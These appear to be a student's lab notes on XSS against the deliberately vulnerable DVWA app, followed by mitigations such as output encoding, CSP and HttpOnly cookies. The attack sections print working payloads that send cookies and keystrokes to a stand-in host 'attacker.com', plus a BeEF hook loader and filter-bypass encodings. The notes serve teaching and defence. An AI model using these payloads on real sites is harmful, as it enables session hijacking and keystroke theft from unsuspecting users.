# Cross-Site Scripting (XSS) Notes — Task 3

## What is XSS?
Cross-Site Scripting (XSS) is a client-side injection attack where an attacker injects malicious scripts into web pages viewed by other users. The browser executes the script as if it came from the trusted site.

---

## 1. Types of XSS

| Type | Storage | Who is Affected | Persistence |
|------|---------|----------------|-------------|
| **Stored (Persistent)** | Database | All users who view the page | Permanent until removed |
| **Reflected (Non-persistent)** | URL/Request | User who clicks the malicious link | None |
| **DOM-based** | Browser DOM | User who visits crafted URL | None |

---

## 2. Stored XSS on DVWA

### Target
`http://127.0.0.1/dvwa/vulnerabilities/xss_s/`
Security Level: **Low**

### What it Does
The guestbook page stores user input in the database and displays it to all visitors. If input is not sanitized, injected scripts execute for every user who views the page.

### Basic Test
```html
<script>alert('XSS')</script>
```
Enter in the "Message" field → Submit → Alert box pops for every visitor.

### Cookie Theft (Session Hijacking)
```html
<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
```
Sends victim's session cookie to attacker's server.

Simulated with Python HTTP server:
```bash
python3 -m http.server 8000
# Then submit: <script>fetch('http://127.0.0.1:8000/?c='+document.cookie)</script>
```

### Keylogger
```html
<script>
document.onkeypress = function(e) {
    fetch('http://attacker.com/log?k=' + e.key);
}
</script>
```

### Defacement
```html
<script>document.body.innerHTML='<h1>Hacked</h1>'</script>
```

### Redirect
```html
<script>window.location='http://attacker.com'</script>
```

### XSS with Image Tag (bypass script filters)
```html
<img src=x onerror="alert('XSS')">
```

### BeEF Hook (Browser Exploitation Framework)
```html
<script src="http://attacker.com:3000/hook.js"></script>
```

---

## 3. Reflected XSS on DVWA

### Target
`http://127.0.0.1/dvwa/vulnerabilities/xss_r/`
Security Level: **Low**

### What it Does
The page reflects the `name` parameter from the URL directly into the HTML response without sanitization.

### Basic Test
Enter in the "What's your name?" field:
```html
<script>alert('Reflected XSS')</script>
```

### URL-based Attack
The payload is in the URL — attacker sends this link to victim:
```
http://127.0.0.1/dvwa/vulnerabilities/xss_r/?name=<script>alert('XSS')</script>
```

### Cookie Theft via Reflected XSS
```
http://127.0.0.1/dvwa/vulnerabilities/xss_r/?name=<script>document.location='http://attacker.com/?c='+document.cookie</script>
```

### Encoded Payloads (Bypass filters)
```
# URL encoded
%3Cscript%3Ealert('XSS')%3C%2Fscript%3E

# HTML entity encoded
&lt;script&gt;alert('XSS')&lt;/script&gt;

# Double URL encoded
%253Cscript%253Ealert('XSS')%253C%252Fscript%253E
```

---

## 4. DOM-based XSS on DVWA

### Target
`http://127.0.0.1/dvwa/vulnerabilities/xss_d/`

### What it Does
The page reads a value from the URL hash or query string and writes it directly into the DOM using JavaScript, without server-side processing.

```
http://127.0.0.1/dvwa/vulnerabilities/xss_d/?default=<script>alert('DOM XSS')</script>
```

### DOM XSS Sinks (dangerous functions)
```javascript
document.write()
innerHTML
outerHTML
eval()
setTimeout()
setInterval()
document.location
window.location.href
```

---

## 5. Mitigation — Input Validation & Output Encoding

### Output Encoding (Primary Defense)
```php
// VULNERABLE
echo "<p>Hello " . $_GET['name'] . "</p>";

// SECURE — HTML encode output
echo "<p>Hello " . htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8') . "</p>";
```

`htmlspecialchars()` converts:
| Character | Encoded |
|-----------|---------|
| `<` | `&lt;` |
| `>` | `&gt;` |
| `"` | `&quot;` |
| `'` | `&#039;` |
| `&` | `&amp;` |

### Input Validation
```php
// Allow only alphanumeric and spaces
$name = preg_replace('/[^a-zA-Z0-9 ]/', '', $_GET['name']);

// Strip HTML tags
$name = strip_tags($_GET['name']);

// Limit length
$name = substr($_GET['name'], 0, 50);
```

### Content Security Policy (CSP)

CSP is an HTTP response header that tells the browser which scripts are allowed to execute.

**Add to Apache config** (`/etc/apache2/apache2.conf` or `.htaccess`):
```apache
Header set Content-Security-Policy "default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self' data:; object-src 'none';"
```

**CSP Directives:**
| Directive | Purpose |
|-----------|---------|
| `default-src 'self'` | Only load resources from same origin |
| `script-src 'self'` | Only execute scripts from same origin |
| `script-src 'nonce-xxx'` | Only execute scripts with matching nonce |
| `object-src 'none'` | Block plugins (Flash, Java) |
| `unsafe-inline` | Allow inline scripts (avoid this) |
| `unsafe-eval` | Allow eval() (avoid this) |

**Strict CSP Example:**
```
Content-Security-Policy: default-src 'none'; script-src 'nonce-r@nd0m'; style-src 'self'; img-src 'self';
```

**In PHP:**
```php
$nonce = base64_encode(random_bytes(16));
header("Content-Security-Policy: script-src 'nonce-$nonce'");
echo "<script nonce='$nonce'>/* safe script */</script>";
```

### HttpOnly Cookie Flag
Prevents JavaScript from accessing session cookies:
```php
session_set_cookie_params(['httponly' => true, 'secure' => true, 'samesite' => 'Strict']);
session_start();
```

Or in Apache:
```apache
Header edit Set-Cookie ^(.*)$ $1;HttpOnly;Secure;SameSite=Strict
```

---

## 6. XSS Prevention Summary

| Defense | Prevents |
|---------|---------|
| `htmlspecialchars()` output encoding | Reflected & Stored XSS |
| Content Security Policy (CSP) | Inline script execution |
| HttpOnly cookie flag | Cookie theft via XSS |
| Secure cookie flag | Cookie theft over HTTP |
| Input validation / sanitization | Malformed input |
| X-XSS-Protection header | Basic browser XSS filter (legacy) |
| DOM sanitization (DOMPurify) | DOM-based XSS |

---

## 7. Testing Tools

```bash
# XSSer — automated XSS scanner
xsser --url "http://127.0.0.1/dvwa/vulnerabilities/xss_r/?name=XSS"

# Manual browser test
# Open browser console: document.cookie

# Burp Suite — intercept and inject XSS payloads
# Use Repeater to test different payloads
# Use Intruder with XSS payload list
```

**XSS Payload Lists:**
- `/usr/share/seclists/Fuzzing/XSS/XSS-Jhaddix.txt`
- https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

---

## Key Takeaways
- Stored XSS is more dangerous — it affects ALL visitors, not just one
- Reflected XSS requires social engineering to deliver the link
- `htmlspecialchars()` is the single most important XSS defense in PHP
- CSP provides defense-in-depth — even if XSS exists, scripts can't execute
- HttpOnly cookies prevent the most common XSS impact (session hijacking)
- Never trust user input — encode everything on output
